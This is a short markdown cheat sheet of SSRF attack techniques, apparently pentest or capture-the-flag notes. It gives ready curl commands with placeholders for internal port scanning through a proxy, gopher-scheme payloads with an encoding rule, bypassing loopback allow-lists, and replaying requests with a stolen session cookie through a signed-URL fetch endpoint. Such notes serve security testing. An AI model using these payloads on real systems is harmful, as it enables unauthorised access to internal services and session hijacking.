# SSRF

A hostname allow-list is not an IP restriction — if the allowed hostname itself resolves to loopback/internal (via `/etc/hosts` or attacker-controlled DNS), it's a loopback bypass, not a real allow-list.

```bash
http://<TARGET>/<proxy-endpoint>?url=http://<allowed-hostname>/admin
http://<TARGET>/<proxy-endpoint>?url=http://<allowed-hostname>/<sensitive-path>
```

Chain to watch for: a second check further in (e.g. `if not request.remote_addr.startswith("127.")`) can be satisfied by the exact same SSRF, since the proxying server is now the one making the request.

Internal port scan through the SSRF itself — loop ports and use timing/response differences as the oracle:
```bash
for p in $(seq 1 65535); do curl -s -o /dev/null -w "%{http_code} $p\n" "http://<TARGET>/<proxy>?url=http://127.0.0.1:$p"; done
```

Gopher scheme turns a URL-fetch SSRF into a raw request to any TCP service (full headers, POST body — not just GET):
```bash
gopher://127.0.0.1:<port>/_GET%2520/path%2520HTTP/1.1%250d%250aHost:%2520127.0.0.1%250d%250a<Header>:%2520<value>%250d%250a
# encoding rule: double-encode space/CR/LF, single-encode '/', leave keywords/digits alone
```

If the fetch feature recognizes special directives in the fetched content (not just rendering it), hosting a page containing that directive can turn the SSRF into something more powerful (e.g. a literal `FILE_READ /path` string triggering local file disclosure) — check the client-side JS for any such parsed "result type".

A "signed-URL" fetch proxy (sign the URL via one endpoint, fetch it via another) only authorizes *which URL*, not *how it's requested* — if the fetch endpoint also accepts `method`/`body`/`headers` alongside the signed `url`, you can replay full POST requests (including a stolen session cookie as a header) against internal-only hosts:
```bash
curl "<TARGET>/api/sign?url=http://<internal-host>/login"              # get a signature for the URL you want
curl "<TARGET>/api/fetch?url=http://<internal-host>/login&sig=<sig>"   # confirm basic GET works
curl -X POST <TARGET>/api/fetch -H 'Content-Type: application/json' -d '{
  "url":"http://<internal-host>/dashboard","sig":"<sig>",
  "method":"GET","headers":{"Cookie":"session=<stolen-cookie>"}
}'
```
Enumerate reachable internal vhosts by signing+fetching candidate hostnames in a loop (distinct "unknown host" vs real-response text is the oracle) — a vhost allowlist on the *outer* app doesn't protect the SSRF target.

